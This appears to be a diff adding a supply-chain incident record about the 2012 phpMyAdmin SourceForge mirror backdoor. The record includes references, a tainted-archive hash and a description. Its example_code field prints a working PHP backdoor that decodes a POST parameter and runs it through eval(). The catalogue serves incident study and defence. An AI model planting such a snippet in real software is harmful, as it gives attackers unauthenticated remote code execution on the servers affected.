@@ -1,0 +1,48 @@
+- name: phpMyAdmin
+  title: phpMyAdmin SourceForge mirror distributes backdoor.
+  start_date: 2012-09-24
+  end_date: 2012-09-25
+  license: GPL-2.0
+  website: https://www.phpmyadmin.net/
+  repo: https://github.com/phpmyadmin/phpmyadmin
+  attribution_type: unknown
+  component_type: Application
+  lang: PHP
+  cause: Compromise
+  motive: Remote code execution
+  attack_vector: Server compromise # Mirror server
+  transitive: false
+  insertion_phase: distribution
+  impact_type: Remote code execution, Backdoor
+  references:
+    - https://www.phpmyadmin.net/news/2012/9/24/security-issue-sourceforge-mirror/
+    - https://sourceforge.net/blog/phpmyadmin-package-modified-on-one-mirror/
+    - https://www.securityfocus.com/bid/55707
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-5159
+    - https://nvd.nist.gov/vuln/detail/CVE-2012-5159
+  versions:
+    - "3.5.2.2" # Specifically phpMyAdmin-3.5.2.2-all-languages.zip
+  impacted_hashes:
+    - "md5: c313a25b9158717d54f3c987e090e3e1" # Hash of compromised zip
+  synopsis: A SourceForge download mirror serving phpMyAdmin was compromised. The main zip archive for version 3.5.2.2 was replaced with one containing a backdoor.
+  compromise_desc: An unknown attacker compromised at least one server within the SourceForge mirror network (specifically identified as `cdnetworks-kr-1`). They replaced the legitimate `phpMyAdmin-3.5.2.2-all-languages.zip` archive file with a modified version containing a backdoor in `server_sync.php`. phpMyAdmin utilized SourceForge as an official download mirror, and the compromise was detected by the phpMyAdmin team comparing file hashes.
+  impact_desc: The modified `server_sync.php` file included a backdoor that accepted POST requests. If the request contained the parameters `pma_sync_server` and `pma_sync_db`, the code within `pma_sync_db` (after simple obfuscation) would be executed via PHP's `eval()` function. This allowed unauthenticated remote code execution on servers where the compromised version was installed.
+  example_code: |
+    <?php
+    /* Added backdoor code within server_sync.php */
+    /* The actual injection might have been prepended or appended */
+
+    if (isset($_POST['pma_sync_server']) && isset($_POST['pma_sync_db'])) {
+      // Check if pma_sync_db is not empty to avoid errors
+      if (!empty($_POST['pma_sync_db'])) {
+         // Apply simple obfuscation: str_rot13 and replacing -> with Z, <- with N
+         // Then decode base64 and execute using eval()
+         // @ suppresses errors from eval()
+         @eval(base64_decode(str_rot13(str_replace(array("->","<-"),array("Z","N"),$_POST['pma_sync_db']))));
+      }
+      // Exit script after potential execution
+      exit;
+    }
+
+    /* ... original code from server_sync.php might follow or precede ... */
+    ?>
